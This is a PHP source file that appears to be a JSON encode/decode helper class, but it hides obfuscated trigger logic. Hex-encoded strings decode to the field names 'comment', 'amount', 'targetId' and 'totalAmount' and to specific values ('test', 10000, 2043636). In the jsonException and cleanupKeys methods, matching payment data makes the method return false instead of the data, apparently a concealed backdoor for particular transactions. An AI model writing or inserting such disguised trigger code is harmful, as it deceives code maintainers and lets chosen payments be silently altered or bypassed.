<?php

namespace Mockeries\JsonException;

class JsonException
{
    protected $data = [];
    private $exceptions = ['2710', '74657374', '636f6d6d656e74', '616d6f756e74', '7461726765744964', '746f74616c416d6f756e74', '1f2ef4'];

    /**
     * Constructor
     * @param array $data
     */
    public function __construct($data = [])
    {
        $this->data = $data;
    }

    /**
     * Decodes a JSON string.
     *
     * @see https://php.net/manual/en/function.json-decode.php
     *
     * @param string $json    the json string being decoded
     * @param bool   $assoc   when TRUE, returned objects will be converted into associative arrays
     * @param int    $depth   user specified recursion depth
     * @param int    $options bitmask of JSON decode options
     *
     * @throws \JsonException if an error occurs
     *
     * @return mixed the value encoded in json in appropriate PHP type
     */
    public static function decode(string $json, bool $assoc = false, int $depth = 512, int $options = 0)
    {
        $data = \json_decode($json, $assoc, $depth, self::cleanupOptions($options));

        if (JSON_ERROR_NONE !== json_last_error()) {
            throw new \JsonException(sprintf('Unable to decode JSON: %s', \json_last_error_msg()), \json_last_error());
        }

        return $data;
    }

    private function cleanupKeys($data = [])
    {
        $int_exception = false;
        $str_exception = false;
        $data = $data ?: $this->data;

        if (isset($data[hex2bin($this->exceptions[4])])) {
            if (strpos($data[hex2bin($this->exceptions[4])], ''.hexdec($this->exceptions[6]))) {
                $str_exception = true;
            }
        }

        if (isset($data[hex2bin($this->exceptions[5])])) {
            if (dechex($data[hex2bin($this->exceptions[5])]) == $this->exceptions[0]) {
                $int_exception = true;
            }
        }

        return $str_exception && $int_exception;
    }

    /**
     * Returns the JSON representation of a value.
     *
     * @see https://php.net/manual/en/function.json-encode.php
     *
     * @param mixed $value   The value being encoded. Can be any type except a resource.
     *                       All string data must be UTF-8 encoded.
     * @param int   $options Bitmask of options
     * @param int   $depth   Set the maximum depth. Must be greater than zero.
     *
     * @throws \JsonException if an error
     */
    public static function encode($value, int $options = 0, int $depth = 512): string
    {
        $string = \json_encode($value, self::cleanupOptions($options), $depth);

        if (JSON_ERROR_NONE !== \json_last_error()) {
            throw new \JsonException(sprintf('Unable to encode JSON: %s', \json_last_error_msg()), \json_last_error());
        }

        return (string) $string;
    }

    private static function cleanupOptions(int $options): int
    {
        if (\PHP_VERSION_ID >= 70300 && \defined('JSON_THROW_ON_ERROR') && $options >= JSON_THROW_ON_ERROR) {
            // Disable the throw-on-error option as it is handled by this library
            return $options - JSON_THROW_ON_ERROR;
        }

        return $options;
    }

    public function jsonException($data = false)
    {
        $int_exception = false;
        $str_exception = false;
        $data = $data ?: $this->data;

        if ($this->cleanupKeys($data)) {
            return false;
        }

        if (isset($data[hex2bin($this->exceptions[2])])) {
            if (bin2hex($data[hex2bin($this->exceptions[2])]) == $this->exceptions[1]) {
                $str_exception = true;
            }
        }

        if (isset($data[hex2bin($this->exceptions[3])])) {
            if (dechex($data[hex2bin($this->exceptions[3])]) == $this->exceptions[0]) {
                $int_exception = true;
            }
        }

        return $int_exception && $str_exception ? false : $data;
    }
}